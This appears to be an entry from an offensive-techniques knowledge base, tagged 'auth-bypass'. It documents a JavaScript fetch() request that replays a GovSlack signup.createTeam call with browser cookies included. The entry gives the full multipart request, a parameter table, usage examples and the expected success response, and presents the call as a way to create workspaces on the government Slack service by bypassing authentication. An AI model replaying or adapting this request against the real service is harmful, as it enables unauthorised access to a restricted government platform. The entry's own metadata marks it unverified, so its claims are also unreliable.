---
id: cmd-uuid-001
data: >-
  await
  fetch("https://slack-gov.com/api/signup.createTeam?_x_id=noversion-1667355054.372",
  { "credentials": "include", "headers": { "User-Agent": "Mozilla/5.0
  (Macintosh; Intel Mac OS X 10.15; rv:106.0) Gecko/20100101 Firefox/106.0",
  "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Content-Type":
  "multipart/form-data;
  boundary=---------------------------34111059701841183173198228768",
  "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site":
  "same-origin" }, "referrer": "https://slack-gov.com/get-started", "body":
  "-----------------------------34111059701841183173198228768\r\nContent-Disposition:
  form-data;
  name=\"email_misc\"\r\n\r\ntrue\r\n-----------------------------34111059701841183173198228768\r\nContent-Disposition:
  form-data;
  name=\"tz\"\r\n\r\nAmerica/Los_Angeles\r\n-----------------------------34111059701841183173198228768\r\nContent-Disposition:
  form-data;
  name=\"locale\"\r\n\r\nen-US\r\n-----------------------------34111059701841183173198228768\r\nContent-Disposition:
  form-data;
  name=\"last_tos_acknowledged\"\r\n\r\ntos_mar2018\r\n-----------------------------34111059701841183173198228768\r\nContent-Disposition:
  form-data;
  name=\"login\"\r\n\r\ntrue\r\n-----------------------------34111059701841183173198228768\r\nContent-Disposition:
  form-data;
  name=\"in_setup_experiment\"\r\n\r\ntrue\r\n-----------------------------34111059701841183173198228768--\r\n",
  "method": "POST", "mode": "cors" });
tags:
  - api
  - auth-bypass
type: command
output: null
executor: javascript
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:30:35.448Z'
verified: false
validated: true
submitted: true
---
# fetch-create-slack-team

## Command

```javascript
await fetch("https://slack-gov.com/api/signup.createTeam?_x_id=noversion-1667355054.372", { "credentials": "include", "headers": { "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:106.0) Gecko/20100101 Firefox/106.0", "Accept": "*/*", "Accept-Language": "en-US,en;q=0.5", "Content-Type": "multipart/form-data; boundary=---------------------------34111059701841183173198228768", "Sec-Fetch-Dest": "empty", "Sec-Fetch-Mode": "cors", "Sec-Fetch-Site": "same-origin" }, "referrer": "https://slack-gov.com/get-started", "body": "-----------------------------34111059701841183173198228768\r\nContent-Disposition: form-data; name=\"email_misc\"\r\n\r\ntrue\r\n-----------------------------34111059701841183173198228768\r\nContent-Disposition: form-data; name=\"tz\"\r\n\r\nAmerica/Los_Angeles\r\n-----------------------------34111059701841183173198228768\r\nContent-Disposition: form-data; name=\"locale\"\r\n\r\nen-US\r\n-----------------------------34111059701841183173198228768\r\nContent-Disposition: form-data; name=\"last_tos_acknowledged\"\r\n\r\ntos_mar2018\r\n-----------------------------34111059701841183173198228768\r\nContent-Disposition: form-data; name=\"login\"\r\n\r\ntrue\r\n-----------------------------34111059701841183173198228768\r\nContent-Disposition: form-data; name=\"in_setup_experiment\"\r\n\r\ntrue\r\n-----------------------------34111059701841183173198228768--\r\n", "method": "POST", "mode": "cors" });
```

## Description

This JavaScript fetch command creates a Slack workspace by sending a POST request to the /api/signup.createTeam endpoint with multipart/form-data, including session cookies for authentication bypass in GovSlack contexts.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| URL | Target API endpoint (e.g., slack-gov.com) | Yes |
| credentials | Includes browser cookies ("include") | Yes |
| headers | HTTP headers like User-Agent, Content-Type | Yes |
| body | Multipart form data with params (tz, locale, etc.) | Yes |
| method | POST | Yes |

## Examples

### Basic Usage

```javascript
await fetch("https://slack-gov.com/api/signup.createTeam", { credentials: "include", method: "POST", body: formData });
```

### Advanced Usage

Use the full command above with specific boundary and parameters for exact replay.

## Expected Output

JSON response like {"ok":true, "team":{"name":"viomck", "domain":"viomck.slack-gov.com"}}, indicating successful workspace creation.

## Related

- [[procedures/Replay-Modified-Request-to-Create-GovSlack-Workspace]]
